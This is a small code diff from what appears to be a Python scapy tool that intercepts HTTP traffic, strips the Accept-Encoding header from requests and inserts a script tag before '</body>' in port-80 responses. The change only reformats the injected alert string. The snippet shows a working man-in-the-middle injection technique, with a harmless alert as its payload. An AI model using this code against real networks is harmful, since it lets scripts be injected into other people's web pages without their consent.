@@ -28,7 +28,8 @@ def inject_code(packet):
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
         elif http_packet[scapy.TCP].sport == 80:
-            injection_code = "<script>alert('Hello from devopslife.xyz');</script>"
+            injection_code = """<script>alert('Hello from devopslife.xyz');
+                                </script>"""
             load = load.replace("</body>", injection_code + "</body>")
             length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if length_search and "text/html" in load:
